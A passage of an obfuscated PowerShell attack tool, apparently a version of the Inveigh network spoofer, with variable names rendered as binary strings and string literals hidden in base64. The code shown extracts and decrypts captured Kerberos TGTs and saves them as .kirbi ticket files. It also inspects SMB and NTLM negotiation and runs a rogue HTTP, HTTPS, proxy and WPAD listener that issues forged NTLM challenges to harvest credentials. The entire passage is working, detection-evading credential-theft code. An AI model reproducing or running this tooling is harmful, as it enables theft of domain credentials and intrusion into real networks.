        param([Byte[]]${_01001100010001111},[Byte[]]${_01010011010110010},[String]${_10111011000100111},[String]${_10101011100001101},[String]$session)
        ${01010110010110101} = [System.BitConverter]::ToString(${_01001100010001111})
        ${01010110010110101} = ${01010110010110101} -replace "-",""
        ${00011001101111001} = ${01010110010110101}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAwADAAMwAwADIAMAAxADEAMgBBADEAMAAzADAAMgAwADEA'))))
        if(${00011001101111001} -ge 0)
        {
            ${_00010101001111001} = _10100011010111110 ${_01001100010001111}[(${00011001101111001} / 2 + 10)..(${00011001101111001} / 2 + 15)]
            ${10111010000101110} = ${_00010101001111001}[0]
            ${_00010101001111001} = _10100011010111110 ${_01001100010001111}[(${00011001101111001} / 2 + ${10111010000101110} + 10)..(${00011001101111001} / 2 + ${10111010000101110} + 15)]
            ${10111010000101110} += ${_00010101001111001}[0]
            ${01101110101010000} = ${_00010101001111001}[1]
            [Byte[]]${10010100101000001} = ${_01001100010001111}[(${00011001101111001} / 2 + ${10111010000101110} + 10)..(${00011001101111001} / 2 + ${10111010000101110} + ${01101110101010000} + 9)]
            [Byte[]]${_00101001011100001} = _00011111010001101 encrypt 2 ${_01010011010110010}
            [Byte[]]$cleartext = _01010010011111001 ${_00101001011100001} ${10010100101000001}[0..(${10010100101000001}.Count - 13)]
            $cleartext = $cleartext[16..$cleartext.Count]
            ${10111111001011010} = [System.BitConverter]::ToString($cleartext)
            ${10111111001011010} = ${10111111001011010} -replace "-",""
            ${00011001101111001} = ${10111111001011010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAwADAAMwAwADIAMAAxADEAMgBBADEA'))))
            if(${00011001101111001} -ge 0)
            {
                [Byte[]]${00001011110001111} = $cleartext[30..61]
                [Byte[]]${_00101001011100001} = _00011111010001101 encrypt 11 ${00001011110001111}
                ${00011001101111001} = ${01010110010110101}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAwADAAMwAwADIAMAAxADEAMgBBADIA'))))
                if(${00011001101111001} -ge 0)
                {
                    ${_00010101001111001} = _10100011010111110 ${_01001100010001111}[(${00011001101111001} / 2 + 5)..(${00011001101111001} / 2 + 10)]
                    ${10111010000101110} = ${_00010101001111001}[0]
                    ${_00010101001111001} = _10100011010111110 ${_01001100010001111}[(${00011001101111001} / 2 + ${10111010000101110} + 5)..(${00011001101111001} / 2 + ${10111010000101110} + 10)]
                    ${10111010000101110} += ${_00010101001111001}[0]
                    ${01101110101010000} = ${_00010101001111001}[1]
                    [Byte[]]${10010100101000001} = ${_01001100010001111}[(${00011001101111001} / 2 + ${10111010000101110} + 5)..(${00011001101111001} / 2 + ${10111010000101110} + ${01101110101010000} + 4)]
                    [Byte[]]$cleartext = _01010010011111001 ${_00101001011100001} ${10010100101000001}[0..(${10010100101000001}.Count - 13)]
                    [Byte[]]${_00101001011100001} = _00011111010001101 encrypt 14 ${00001011110001111}
                    $cleartext = $cleartext[16..$cleartext.Count]
                    [Byte[]]${_01110101001011000} = _10000101101100001 $cleartext
                    ${_00010101001111001} = _10100011010111110 $cleartext[4..9]
                    ${10111010000101110} = ${_00010101001111001}[0]
                    ${_00010101001111001} = _10100011010111110 $cleartext[(${10111010000101110} + 4)..(${10111010000101110} + 9)]
                    ${10111010000101110} += ${_00010101001111001}[0]
                    ${00111110011011010} = $cleartext[(${10111010000101110} + 7)]
                    ${10010101010000001} = _01010001111100011 0 ${00111110011011010} $cleartext[(${10111010000101110} + 8)..(${10111010000101110} + ${00111110011011010} + 7)]
                    ${00110001011110110} = $cleartext[(${10111010000101110} + ${00111110011011010} + 22)]
                    ${_00101111111011011} = _01010001111100011 0 ${00110001011110110} $cleartext[(${10111010000101110} + ${00111110011011010} + 23)..(${10111010000101110} + ${00111110011011010} + ${00110001011110110} + 22)]
                    ${10111111001011010} = [System.BitConverter]::ToString($cleartext)
                    ${10111111001011010} = ${10111111001011010} -replace "-",""
                    ${00011001101111001} = ${10111111001011010}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAwADAAMwAwADIAMAAxADEAMgBBADIA'))))
                    if(${00011001101111001} -ge 0)
                    {
                        ${_00010101001111001} = _10100011010111110 $cleartext[(${00011001101111001} / 2 + 5)..(${00011001101111001} / 2 + 10)]
                        ${10111010000101110} = ${_00010101001111001}[0]
                        ${_00010101001111001} = _10100011010111110 $cleartext[(${00011001101111001} / 2 + ${10111010000101110} + 5)..(${00011001101111001} / 2 + ${10111010000101110} + 10)]
                        ${10111010000101110} += ${_00010101001111001}[0]
                        ${01101110101010000} = ${_00010101001111001}[1]
                        [Byte[]]${10010100101000001} = $cleartext[(${00011001101111001} / 2 + ${10111010000101110} + 5)..(${00011001101111001} / 2 + ${10111010000101110} + ${01101110101010000} + 4)]
                        [Byte[]]$cleartext = _01010010011111001 ${_00101001011100001} ${10010100101000001}[0..(${10010100101000001}.Count - 13)]
                        $cleartext = $cleartext[16..$cleartext.Count]
                        [Byte[]]${_10101000100100000} = _10011101101010111 $cleartext
                        [Byte[]]${10110100000000111} = _01100111000100101 ${_01110101001011000} ${_10101000100100000}
                        if(${_00101111111011011} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAwADAALQBcAHgANwBGAF0AKwA='))) -and ${10010101010000001} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAwADAALQBcAHgANwBGAF0AKwA='))))
                        {
                            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos TGT captured for ${_00101111111011011}@${10010101010000001} from $session") > $null   
                            ${00101000010000101}.kerberos_TGT_list.Add(${10110100000000111}) > $null
                            ${00101000010000101}.kerberos_TGT_username_list.Add("${10100011000000011} ${_00101111111011011} ${10010101010000001} $(${00101000010000101}.kerberos_TGT_list.Count - 1)") > $null
                            ${10010011011101000} = (${00101000010000101}.kerberos_TGT_username_list -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgACQAewBfADAAMAAxADAAMQAxADEAMQAxADEAMQAwADEAMQAwADEAMQB9ACAAJAB7ADEAMAAwADEAMAAxADAAMQAwADEAMAAwADAAMAAwADAAMQB9ACAAKgA=')))).Count
                        }
                        if(${10010011011101000} -le $KerberosCount)
                        {
                            try
                            {
                                ${01000101000001001} = ${00110110010110001} + "\${_00101111111011011}@${10010101010000001}-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
                                ${01101111111001101} = New-Object System.IO.FileStream ${01000101000001001},$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                                ${01101111111001101}.Write(${10110100000000111},0,${10110100000000111}.Count)
                                ${01101111111001101}.close()
                                ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos TGT for ${_00101111111011011}@${10010101010000001} written to ${01000101000001001}") > $null
                            }
                            catch
                            {
                                ${01100011111101101} = $_.Exception.Message
                                ${01100011111101101} = ${01100011111101101} -replace "`n",""
                                ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
                            }
                        }
                    }
                    else
                    {
                        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos TGT not found from $session") > $null    
                    }
                }
                else
                {
                    ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos autenticator not found from $sessiont") > $null    
                }
            }
            else
            {
                ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos failed to decrypt capture from $session") > $null    
            }
        }
        else
        {
            if(${01010110010110101} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBADAAMAAzADAAMgAwADEAPwA/AEEAMQAwADMAMAAyADAAMQAqAA=='))))
            {
                if(${01010110010110101} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBADAAMAAzADAAMgAwADEAMQAxAEEAMQAwADMAMAAyADAAMQAqAA=='))))
                {
                    ${10110000101100000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBFAFMAMQAyADgALQBDAFQAUwAtAEgATQBBAEMALQBTAEgAQQAxAC0AOQA2AA==')))
                }
                elseif(${01010110010110101} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBADAAMAAzADAAMgAwADEAMQA3AEEAMQAwADMAMAAyADAAMQAqAA=='))))
                {
                    ${10110000101100000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBDADQALQBIAE0AQQBDAA==')))
                }
                elseif(${01010110010110101} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBADAAMAAzADAAMgAwADEAMQA4AEEAMQAwADMAMAAyADAAMQAqAA=='))))
                {
                    ${10110000101100000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBDADQALQBIAE0AQQBDAC0ARQBYAFAA')))
                }
                elseif(${01010110010110101} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBADAAMAAzADAAMgAwADEAMAAzAEEAMQAwADMAMAAyADAAMQAqAA=='))))
                {
                    ${10110000101100000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAFMALQBDAEIAQwAtAE0ARAA1AA==')))
                }
                elseif(${01010110010110101} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBADAAMAAzADAAMgAwADEAMAAxAEEAMQAwADMAMAAyADAAMQAqAA=='))))
                {
                    ${10110000101100000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAFMALQBDAEIAQwAtAEMAUgBDAA==')))
                }
                ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos unsupported encryption type ${10110000101100000} from $session") > $null
            }
            else
            {
                ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] ${_10111011000100111}(${_10101011100001101}) Kerberos failed to extract AS-REQ from $session") > $null 
            }
        }
    }
}
${01000101100000110} =
{
    function _01001010110001110
    {
        param ([Byte[]]${_00000010100101000},[String]${_10011110110101011},[String]${_10101110100101010},[String]${_01101010111110011},[String]${_01001101011100110},[String]${_10100101101011110})
        ${00000100001100110} = [System.BitConverter]::ToString(${_00000010100101000})
        ${00000100001100110} = ${00000100001100110} -replace "-",""
        $session = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMQAwADEAMAAxADEAMQAwADEAMAAwADEAMAAxADAAMQAwAH0AOgAkAHsAXwAwADEAMAAwADEAMQAwADEAMAAxADEAMQAwADAAMQAxADAAfQA=')))
        ${10000010100101010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAwADAAMQAxAH0AOgAkAHsAXwAxADAAMQAwADAAMQAwADEAMQAwADEAMAAxADEAMQAxADAAfQA=')))
        ${10100001001100110} = ${00000100001100110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBGADUAMwA0AEQANAAyAA=='))))
        if(!${00101000010000101}.SMB_session_table.ContainsKey($Session) -and ${10100001001100110} -gt 0 -and ${00000100001100110}.SubString((${10100001001100110} + 8),2) -eq "72" -and ${_10101110100101010} -ne ${_10011110110101011})
        {
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_10100101101011110}) negotiation request detected from $session") > $null
        }
        elseif(!${00101000010000101}.SMB_session_table.ContainsKey($Session) -and ${10100001001100110} -gt 0 -and ${00000100001100110}.SubString((${10100001001100110} + 8),2) -eq "72" -and ${_10101110100101010} -eq ${_10011110110101011})
        {
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_01001101011100110}) outgoing negotiation request detected to ${10000010100101010}") > $null
        }
        if(!${00101000010000101}.SMB_session_table.ContainsKey($Session) -and ${10100001001100110} -gt 0)
        {
            ${00101000010000101}.SMB_session_table.Add($Session,"")
        }
        ${10100001001100110} = ${00000100001100110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBFADUAMwA0AEQANAAyAA=='))))
        if(!${00101000010000101}.SMB_session_table.ContainsKey($Session) -and ${10100001001100110} -gt 0 -and ${00000100001100110}.SubString((${10100001001100110} + 24),4) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAA='))) -and ${_10101110100101010} -ne ${_10011110110101011})
        {
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_10100101101011110}) negotiation request detected from $session") > $null
        }
        elseif(!${00101000010000101}.SMB_session_table.ContainsKey($Session) -and ${10100001001100110} -gt 0 -and ${00000100001100110}.SubString((${10100001001100110} + 24),4) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAA='))) -and ${_10101110100101010} -eq ${_10011110110101011})
        {
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_01001101011100110}) outgoing negotiation request detected to ${10000010100101010}") > $null
        }
        if(!${00101000010000101}.SMB_session_table.ContainsKey($Session) -and ${10100001001100110} -gt 0)
        {
            ${00101000010000101}.SMB_session_table.Add($Session,"")
        }
        ${10100001001100110} = ${00000100001100110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgBBADgANgA0ADgAOAA2AEYANwAxADIAMAAxADAAMgAwADIAMAAxADAAMAA='))))
        if(${10100001001100110} -gt 0 -and ${_10101110100101010} -ne ${_10011110110101011})
        {
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_10100101101011110}) authentication method is Kerberos for $session") > $null
            if($Kerberos -eq 'Y')
            {
                ${10100101010011111} = _01111000101011100 0 ${_00000010100101000}[82..83]
                ${10100101010011111} -= ${10100001001100110} / 2
                ${00111011110001011} = ${_00000010100101000}[(${10100001001100110}/2)..(${10100001001100110}/2 + ${_00000010100101000}.Count)]
            }
        }
        elseif(${10100001001100110} -gt 0 -and ${_10101110100101010} -eq ${_10011110110101011})
        {
            ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] SMB(${_01001101011100110}) outgoing authentication method is Kerberos to ${10000010100101010}") > $null
            if($Kerberos -eq 'Y')
            {
                ${10100101010011111} = _01111000101011100 0 ${_00000010100101000}[82..83]
                ${10100101010011111} -= ${10100001001100110} / 2
                ${00111011110001011} = ${_00000010100101000}[(${10100001001100110}/2)..(${10100001001100110}/2 + ${_00000010100101000}.Count)]
            }
        }
        return ${10100101010011111},${00111011110001011}
    }
    function _10011100000101000
    {
        param ([Byte[]]${_00000010100101000})
        ${00000100001100110} = [System.BitConverter]::ToString(${_00000010100101000})
        ${00000100001100110} = ${00000100001100110} -replace "-",""
        ${00101010011001100} = ${00000100001100110}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        if(${00101010011001100} -gt 0)
        {
            if(${00000100001100110}.SubString((${00101010011001100} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyADAAMAAwADAAMAAwAA=='))))
            {
                ${10011110101000110} = ${00000100001100110}.SubString((${00101010011001100} + 48),16)
            }
            ${01001001010011000} = _01111000101011100 ((${00101010011001100} + 24) / 2) ${_00000010100101000}
            ${00110100010000111} = [System.Convert]::ToInt16((${00000100001100110}.SubString((${00101010011001100} + 44),2)),16)
            ${00110100010000111} = [Convert]::ToString(${00110100010000111},2)
            ${10010110001011110} = ${00110100010000111}.SubString(0,1)
            if(${10010110001011110} -eq 1)
            {
                ${00001111100001100} = (${00101010011001100} + 80) / 2
                ${00001111100001100} = ${00001111100001100} + ${01001001010011000} + 16
                ${10111110001010000} = ${_00000010100101000}[${00001111100001100}]
                ${01100001111100111} = 0
                while(${10111110001010000} -ne 0 -and ${01100001111100111} -lt 10)
                {
                    ${00111010000001110} = _01111000101011100 (${00001111100001100} + 2) ${_00000010100101000}
                    switch(${10111110001010000}) 
                    {
                        2
                        {
                            ${00011010000100101} = _01010001111100011 (${00001111100001100} + 4) ${00111010000001110} ${_00000010100101000}
                        }
                        3
                        {
                            ${00110001110110010} = _01010001111100011 (${00001111100001100} + 4) ${00111010000001110} ${_00000010100101000}
                        }
                        4
                        {
                            ${00101010101100000} = _01010001111100011 (${00001111100001100} + 4) ${00111010000001110} ${_00000010100101000}
                        }
                    }
                    ${00001111100001100} = ${00001111100001100} + ${00111010000001110} + 4
                    ${10111110001010000} = ${_00000010100101000}[${00001111100001100}]
                    ${01100001111100111}++
                }
                if(${00011010000100101} -and ${00101010101100000} -and !${00101000010000101}.domain_mapping_table.${00011010000100101} -and ${00011010000100101} -ne ${00101010101100000})
                {
                    ${00101000010000101}.domain_mapping_table.Add(${00011010000100101},${00101010101100000})
                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for ${00011010000100101} to ${00101010101100000}") > $null
                }
                for(${01100001111100111} = 0;${01100001111100111} -lt ${00101000010000101}.enumerate.Count;${01100001111100111}++)
                {
                    if(${00101000010000101}.enumerate[${01100001111100111}].IP -eq $target -and !${00101000010000101}.enumerate[${01100001111100111}].Hostname)
                    {
                        ${00101000010000101}.enumerate[${01100001111100111}].Hostname = ${00110001110110010}
                        ${00101000010000101}.enumerate[${01100001111100111}]."DNS Domain" = ${00101010101100000}
                        ${00101000010000101}.enumerate[${01100001111100111}]."netBIOS Domain" = ${00011010000100101}
                        break
                    }
                }
            }
        }
        return ${10011110101000110}
    }
}
${10011010110001111} =
{
    param ($Challenge,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$KerberosHostHeader,$HTTPAuth,
    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDirectory,$HTTPResponse,
    ${01010110111111100},$IP,$NBNSBruteForcePause,${00110110010110001},$Proxy,$ProxyIgnore,${10001000111110111},$WPADAuth,
    $WPADAuthIgnore,$WPADResponse)
    function _01110011010010001
    {
        param ([String]$Challenge,[Bool]${_01111011101011010},[String]${_00001111110010111},[Int]${_00001010000001001})
        ${10010110011001110} = Get-Date
        ${10010110011001110} = ${10010110011001110}.ToFileTime()
        ${10010110011001110} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${10010110011001110}))
        ${10010110011001110} = ${10010110011001110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        if($Challenge)
        {
            ${10101000101010111} = $Challenge
            ${00001010111000100} = ${10101000101010111}.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            ${00001010111000100} = ${00001010111000100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            ${00001010111000100} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${10101000101010111} = ${00001010111000100} -replace ' ', ''
            ${00001010111000100} = ${00001010111000100}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        if(${_01111011101011010})
        {
            ${00111110011001111} = 0x05,0x82,0x89,0x0a
        }
        else
        {
            ${00111110011001111} = 0x05,0x82,0x81,0x0a
        }
        if(!${00101000010000101}.HTTP_session_table.ContainsKey($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAwADAAMAAxADEAMQAxADEAMQAwADAAMQAwADEAMQAxAH0AOgAkAHsAXwAwADAAMAAwADEAMAAxADAAMAAwADAAMAAwADEAMAAwADEAfQA=')))))
        {
            ${00101000010000101}.HTTP_session_table.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAwADAAMAAxADEAMQAxADEAMQAwADAAMQAwADEAMQAxAH0AOgAkAHsAXwAwADAAMAAwADEAMAAxADAAMAAwADAAMAAwADEAMAAwADEAfQA='))),${10101000101010111})
        }
        else
        {
            ${00101000010000101}.HTTP_session_table[$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAwADAAMAAxADEAMQAxADEAMQAwADAAMQAwADEAMQAxAH0AOgAkAHsAXwAwADAAMAAwADEAMAAxADAAMAAwADAAMAAwADEAMAAwADEAfQA=')))] = ${10101000101010111}
        }
        ${10110110001011001} = [System.Text.Encoding]::Unicode.GetBytes(${00101000010000101}.computer_name)
        ${00011110000110101} = [System.Text.Encoding]::Unicode.GetBytes(${00101000010000101}.netBIOS_domain)
        ${01100100100000101} = [System.Text.Encoding]::Unicode.GetBytes(${00101000010000101}.DNS_domain)
        ${01011111110001101} = [System.Text.Encoding]::Unicode.GetBytes(${00101000010000101}.DNS_computer_name)
        ${01101001000110110} = [System.BitConverter]::GetBytes(${10110110001011001}.Length)[0,1]
        ${01101110001100111} = [System.BitConverter]::GetBytes(${00011110000110101}.Length)[0,1]
        ${01001000110011101} = [System.BitConverter]::GetBytes(${01100100100000101}.Length)[0,1]
        ${10111100000001111} = [System.BitConverter]::GetBytes(${01011111110001101}.Length)[0,1]
        ${00100101110100011} = [System.BitConverter]::GetBytes(${10110110001011001}.Length + ${00011110000110101}.Length + ${01100100100000101}.Length + ${01100100100000101}.Length + ${01011111110001101}.Length + 36)[0,1]
        ${01100000111000001} = [System.BitConverter]::GetBytes(${00011110000110101}.Length + 56)
        ${00111011110000000} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                            ${01101110001100111} +
                            ${01101110001100111} +
                            0x38,0x00,0x00,0x00 +
                            ${00111110011001111} +
                            ${00001010111000100} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            ${00100101110100011} +
                            ${00100101110100011} + 
                            ${01100000111000001} +
                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +
                            ${00011110000110101} +
                            0x02,0x00 +
                            ${01101110001100111} +
                            ${00011110000110101} +
                            0x01,0x00 +
                            ${01101001000110110} +
                            ${10110110001011001} +
                            0x04,0x00 +
                            ${01001000110011101} +
                            ${01100100100000101} +
                            0x03,0x00 +
                            ${10111100000001111} +
                            ${01011111110001101} +
                            0x05,0x00 +
                            ${01001000110011101} +
                            ${01100100100000101} +
                            0x07,0x00,0x08,0x00 +
                            ${10010110011001110} +
                            0x00,0x00,0x00,0x00,0x0a,0x0a
        ${01011110111001111} = [System.Convert]::ToBase64String(${00111011110000000})
        ${00011101000110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${01011110111001111}
        return ${00011101000110111}
    }
    if(${01010110111111100})
    {
        ${00000110001110101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTAA==')))
    }
    elseif(${10001000111110111})
    {
        ${00000110001110101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA==')))
    }
    else
    {
        ${00000110001110101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
    }
    if($HTTPIP -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA='))))
    {
        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)
        ${10111011010111010} = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)
    }
    else
    {
        ${10111011010111010} = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,$HTTPPort)
    }
    ${01001101101011111} = $true
    ${00000100000110111} = New-Object System.Net.Sockets.TcpListener ${10111011010111010}
    if(${10001000111110111})
    {
        ${00010110001010011} = New-Object System.Net.Sockets.LingerOption($true,0)
        ${00000100000110111}.Server.LingerState = ${00010110001010011}
    }
    try
    {
        ${00000100000110111}.Start()
    }
    catch
    {
        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting ${00000110001110101} listener") > $null
        ${01100011111101101} = $_.Exception.Message
        ${01100011111101101} = ${01100011111101101} -replace "`n",""
        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        ${01001101101011111} = $false
    }
    if($Kerberos -eq 'Y')
    {
        if($KerberosHash)
        {
            ${01110001010011111} = (&{for (${01100001111100111} = 0;${01100001111100111} -lt $KerberosHash.Length;${01100001111100111} += 2){$KerberosHash.SubString(${01100001111100111},2)}}) -join "-"
            ${01110001010011111} = ${01110001010011111}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($KerberosCredential)
        {
            ${01110001010011111} = _01000110110111100 ($KerberosCredential.UserName).Trim("\") $KerberosCredential.Password
        }
    }
    :HTTP_listener_loop while(${00101000010000101}.running -and ${01001101101011111})
    {
        ${00000001011001001} = $null
        ${01010100011100001} = New-Object System.Byte[] 8192
        ${00100101001100000} = $true
        ${00000110000110111} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgAHQAZQB4AHQALwBoAHQAbQBsAA=='))))
        ${01010000010001111} = $null
        ${10010110111000011} = $null
        ${01100001000100001} = $null
        ${10000001001000010} = ''
        ${10000100011000110} = ''
        ${01010011101011011} = $null
        ${01000001000101000} = $null
        ${01100111110101110} = $null
        ${00011101000110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        if(!${10101001111101001}.Connected -and ${00101000010000101}.running)
        {
            ${10111110110101000} = $false
            ${10111001001001000} = ${00000100000110111}.BeginAcceptTcpClient($null,$null)
            do
            {
                if(!${00101000010000101}.running)
                {
                    break HTTP_listener_loop
                }
                sleep -m 10
            }
            until(${10111001001001000}.IsCompleted)
            ${10101001111101001} = ${00000100000110111}.EndAcceptTcpClient(${10111001001001000})
            ${00000011011111110} = ${10101001111101001}.Client.Handle
            if(${01010110111111100})
            {
                ${10100111000011100} = ${10101001111101001}.GetStream()
                ${10010010011000111} = New-Object System.Net.Security.SslStream(${10100111000011100},$false)
                ${10111101100101011} = (ls Cert:\LocalMachine\My | ? {$_.Subject -match ${00101000010000101}.certificate_CN})
                ${10010010011000111}.AuthenticateAsServer(${10111101100101011},$false,[System.Security.Authentication.SslProtocols]::Default,$false)
            }
            else
            {
                ${10010010011000111} = ${10101001111101001}.GetStream()
            }
        }
        if(${01010110111111100})
        {
            [Byte[]]${10010010010111011} = $null
            while(${10100111000011100}.DataAvailable)
            {
                ${10110100111000101} = ${10010010011000111}.Read(${01010100011100001},0,${01010100011100001}.Length)
                ${10010010010111011} += ${01010100011100001}[0..(${10110100111000101} - 1)]
            }
            ${00000001011001001} = [System.BitConverter]::ToString(${10010010010111011})
        }
        else
        {
            while(${10010010011000111}.DataAvailable)
            {
                ${10010010011000111}.Read(${01010100011100001},0,${01010100011100001}.Length) > $null
            }
            ${00000001011001001} = [System.BitConverter]::ToString(${01010100011100001})
        }
        if(${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwACoA'))) -or ${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwACoA'))) -or ${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABmAC0ANABlAC0ANQAzAC0AMgAwACoA'))) -or ${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAzAC0ANABmAC0ANABlAC0ANABlAC0ANAA1AC0ANAAzAC0ANQA0ACoA'))) -or ${00000001011001001} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAwAC0ANABmAC0ANQAzAC0ANQA0ACoA'))))
        {
            ${10001110110110000} = ${00000001011001001}.Substring(${00000001011001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 4,${00000001011001001}.Substring(${00000001011001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 1).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) - 3)
            ${10001110110110000} = ${10001110110110000}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${01100111110101110} = New-Object System.String (${10001110110110000},0,${10001110110110000}.Length)
            ${00011111011101100} = ${10101001111101001}.Client.RemoteEndpoint.Address.IPAddressToString
            ${10000111100010100} = ${10101001111101001}.Client.RemoteEndpoint.Port
            ${01001100111101110} = $true
            if((${00000001011001001}).StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwAA==')))))
            {
